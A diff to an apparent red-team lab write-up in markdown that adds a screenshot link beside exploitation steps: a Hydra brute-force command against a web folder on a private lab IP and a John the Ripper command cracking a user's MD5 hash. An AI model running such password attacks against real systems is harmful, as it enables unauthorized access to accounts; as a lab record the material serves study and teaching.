@@ -142,6 +142,10 @@ c) **Exploitation**
 
 - Hydra brute force action: `hydra -l ashton -p /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder/` Here http-get will go to the website which is the ip address that we have already provided and will navigate to the path like: `http-get 192.168.1.105/company_folders/secret_folder/`
 
+![](images-red/hydra.png)
+
+
+
 - On accessing the secret folder, a new username noted: ryan, need to crack its hash that is also provided in the secret folder
 
 - Crack hash with john the ripper: `john --format=raw-md5 ryans_hash`
